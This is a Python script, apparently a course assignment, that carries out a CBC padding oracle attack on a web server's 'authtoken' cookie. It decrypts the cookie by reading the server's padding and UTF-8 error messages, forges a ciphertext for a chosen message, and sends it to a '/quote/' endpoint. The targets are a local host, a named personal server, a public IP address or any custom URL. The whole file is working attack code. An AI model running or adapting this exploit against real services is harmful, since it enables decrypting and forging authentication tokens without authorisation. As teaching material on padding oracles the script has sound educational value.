from http.cookiejar import Cookie
import requests
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from hashlib import md5
from base64 import b64encode
from base64 import b64decode
import time
import os
os.system('clc' if os.name == 'nt' else 'clear')



class Assignment1Part1(object):
    BLOCK_SIZE = 16
    PORT = ":5000/"
    URL_Local = "http://127.0.0.1"
    URL_ServerDNS1 = "http://andreasahn.duckdns.org"
    URL_ServerDNS2 = "http://andreasahn.asuscomm.com"
    URL_ServerIP = "http://84.238.78.202"
    URL = ""
    online = "online"
    ping = 0
    lastPing = 0
    procent = 0
    timeEstimation = 0
    fpsLimit = 15
    displayTimer = 0

    counter_single_block_attack = 0
    counter_full_attack = 0
    counter_inverted_full_attack = 0
    counter_try_cookie= 0
    result = b''
    process_state = "Getting cookie"

    client = requests.Session()
    timer = time.time()
    
    COOKIES = client.cookies
    IV = b''
    CT = b''
    lastCookieMsg = client.cookies
    statusCode = 0
    content = b''
    
    def __init__(self):
        self.userInterface()
        self.getCookie()
        self.timer = time.time()
        self.process_state += " -> CBC Padding Attack:"
        result = self.full_attack(bytes.fromhex(self.IV),bytes.fromhex(self.CT),self.try_cookie)

        # Forging the ciphertext that is decrypted into the chosen message
        new_message = "<redacted> plain CBC is not secure!"
        encoded = new_message.encode()
        padded_new_message = pad(encoded,self.BLOCK_SIZE)

        self.process_state += " -> Padding new sentence:"
        new_cipher_blocks = self.inverted_full_attack(bytes.fromhex(self.IV),bytes.fromhex(self.CT)[:48],padded_new_message,self.try_cookie)
        new_cipher = b''
        for index in range(1,len(new_cipher_blocks)) :
            new_cipher += new_cipher_blocks[index]

        self.process_state += " -> Checking the new cookie with server"
        self.checkMsgWithServer(new_cipher_blocks[0] + new_cipher)
        self.client.close()
    
    def getCookie(self):
        r = requests.get(self.URL+self.PORT)
        self.content = r.content
        self.statusCode = r
        COOKIES = r.cookies
        self.IV = bytes.fromhex(COOKIES["authtoken"])[:16].hex()
        self.CT = bytes.fromhex(COOKIES["authtoken"])[16:].hex()
        self.lastCookieMsg = r.cookies


    def userInterface(self):
        while(self.URL == ""):
            print("\033c", end="")
            print("Choice a nr.:")
            print("1 : URL Local machine (127.0.0.1)")
            print("2 : AHN-Server DNS1 (andreasahn.duckdns.org)")
            print("3 : AHN-Server DNS2 (andreasahn.asuscomm.com)")
            print("4 : AHN-Server IP (84.238.78.202)")
            print("5 : Costume URL")
            print("6 : Back")
            nr = input()
        
            if nr == "1":
                self.URL = self.URL_Local
            elif nr == "2":
                self.URL = self.URL_ServerDNS1
            elif nr == "3":
                self.URL = self.URL_ServerDNS2
            elif nr == "4":
                self.URL = self.URL_ServerIP
            elif nr == "5":
                self.URL = input("Write your new URL:\n\t")
            elif nr == "6":
                print("Going back...")
                self.URL = "Back"
            else:
                input("Wrong input, press enter to continue...")

            #Tjecing that server is online
            try:
                if nr != 6:
                    print("\nTry connecting to server...")
                    r = requests.get(self.URL+self.PORT)
            except:
                input("The server ->" + self.URL + "<- is offline, choice another one. Press enter to continue...")
                self.URL = ""   

                    


    def display(self):
        if(self.displayTimer < time.time()):
            self.displayTimer = time.time() + (1/(self.fpsLimit))
            print("\033c", end="")
            print("\t\t----- Server Info -----")
            print("URL : " + self.URL + self.PORT)
            print("Server : " + self.online)
            print("Ping :\t" + str(round(self.ping, 3)) + "\tsec")
            print("Server response : " + str(self.statusCode))
            print("Server content : " + str(self.content))
            print("Cookie Send : " + str(self.COOKIES))
            
            print("\n\t\t----- Process -----")
            print("Timer :\t" + str(round(time.time() - self.timer, 3)) + "\tsec")
            print("Estimated time left : " + str(round(self.timeEstimation, 3)) + " sec")
            print("Procent done : " + str(round(self.procent, 2)) + " %")
            print("State : " + self.process_state)
            print("Counter full_attack : " + str(self.counter_full_attack))
            print("Counter inverted full_attack : " + str(self.counter_inverted_full_attack))
            print("Counter single_block_attack : " + str(self.counter_single_block_attack))
            print("Counter try_cookie : " + str(self.counter_try_cookie))

            print("\n\t\t----- Data Before -----")
            print("IV : " + str(self.IV))
            print("CT : " + str(self.CT))

            print("\n\t\t----- Data Result -----")
            print("Result before decode : " + str(self.result))
            print("Recovered plaintext : ", self.result.decode)
            print("Result in txt : " + bytearray.fromhex(self.result.hex()).decode())



    def full_attack(self, iv, ct, oracle):
        self.counter_full_attack += 1
        self.display()

        """Given the iv, ciphertext, and a padding oracle, finds and returns the plaintext"""
        assert len(iv) == self.BLOCK_SIZE and len(ct) % self.BLOCK_SIZE == 0

        msg = iv + ct
        blocks = [msg[i:i+self.BLOCK_SIZE] for i in range(0, len(msg), self.BLOCK_SIZE)]
        

        # loop over pairs of consecutive blocks performing CBC decryption on them
        iv = blocks[0]
        i = 0
        for ct in blocks[1:]:
            i += 1
            self.process_state += "...Block" + str(i)

            dec = self.single_block_attack(ct, oracle)

            pt = bytes(iv_byte ^ dec_byte for iv_byte, dec_byte in zip(iv, dec))
            self.result += pt
            iv = ct

        return self.result



    def inverted_full_attack(self, iv, ct, msg, oracle):
        self.counter_inverted_full_attack += 1
        self.display()
        """Given the iv, ciphertext, message and a padding oracle, finds and returns the ciphertext that, when decrypted, returns the wanted message"""
        assert len(iv) == self.BLOCK_SIZE and len(ct) % self.BLOCK_SIZE == 0 and len(msg) % self.BLOCK_SIZE == 0

        full_cipher = iv + ct
        cipher_blocks = [full_cipher[i:i+self.BLOCK_SIZE] for i in range(0, len(full_cipher), self.BLOCK_SIZE)]
        msg_blocks = [msg[i:i+self.BLOCK_SIZE] for i in range(0, len(msg), self.BLOCK_SIZE)]

        # loop over pairs of consecutive blocks performing CBC decryption on them
        i = 0
        for index in reversed(range(1,len(cipher_blocks))):
            i += 1
            self.process_state += "...Block" + str(i)
            current_block = cipher_blocks[index]
            zeroing_vector = self.single_block_attack(current_block, oracle)
            cipher_blocks[index-1] = bytes(iv_byte ^ msg_byte for iv_byte, msg_byte in zip(zeroing_vector, msg_blocks[index-1]))

        return cipher_blocks



    def single_block_attack(self, block, oracle):
        self.counter_single_block_attack += 1
        self.display()

        """Returns the decryption of the given ciphertext block"""

        # zeroing_iv starts out nulled. each iteration of the main loop will add
        # one byte to it, working from right to left, until it is fully populated,
        # at which point it contains the result of DEC(ct_block)
        zeroing_iv = [0] * self.BLOCK_SIZE

        for pad_val in range(1, self.BLOCK_SIZE+1):
            padding_iv = [pad_val ^ b for b in zeroing_iv]

            for candidate in range(256):
                padding_iv[-pad_val] = candidate
                iv = bytes(padding_iv)
                if oracle(iv, block):
                    if pad_val == 1:
                        # make sure the padding really is of length 1 by changing
                        # the penultimate block and querying the oracle again
                        padding_iv[-2] ^= 1
                        iv = bytes(padding_iv)
                        if not oracle(iv, block):
                            continue  # false positive; keep searching
                    break
            else:
                raise Exception("no valid padding byte found (is the oracle working correctly?)")

            zeroing_iv[-pad_val] = candidate ^ pad_val
            self.procent += 100/((48*2)-1)
            self.timeEstimation = ((time.time() - self.timer) / self.procent) * (100 - self.procent)

        return zeroing_iv



    def try_cookie(self, iv, block):
        self.counter_try_cookie += 1

        cookie = iv + block
        self.COOKIES.clear()
        self.COOKIES["authtoken"] = cookie.hex()
        self.lastCookieMsg = cookie

        r = self.client.get(self.URL+self.PORT+"/quote/",cookies = self.COOKIES)
        self.content = r.content
        self.statusCode = r

        self.serverStatus()
        self.display()

        if (self.content == b'Padding is incorrect.' or self.content == 'PKCS#7 padding is incorrect.' or self.content == b'PKCS#7 padding is incorrect.'):
            return False
        elif (self.content == b'No quote for you!' or (((self.content[:32] == b"'utf-8' codec can't decode byte " ) 
        or (self.content[:33] == b"'utf-8' codec can't decode bytes " ))
        and ((self.content[36:49] == b' in position ') or  (self.content[37:50] == b' in position '))
        and ((self.content[50:] == b': invalid start byte') or (self.content[52:] == b': invalid start byte') 
        or (self.content[50:] == b': invalid continuation byte') or (self.content[52:] == b': invalid continuation byte')
        or (self.content[50:] == b': unexpected end of data') or (self.content[52:] == b': unexpected end of data')))):
            return True
        else:
            input("There is an error in the code. Type enter to continue anyway...")
            return True
        


    def serverStatus(self):
        #Ping time
        self.ping = time.time() - self.lastPing
        self.lastPing = time.time()



    def checkMsgWithServer(self, cookie):
        print("\n\n\t\t-------- Checking end result ---------")
        print("Sending : " + str(cookie))

        self.COOKIES.clear()
        self.COOKIES["authtoken"] = cookie.hex()
        self.lastCookieMsg = cookie   
        r = self.client.get(self.URL+self.PORT+"/quote/",cookies = self.COOKIES)
    
        print("Server response : " + str(r))
        print("Server content : " + str(r.content))
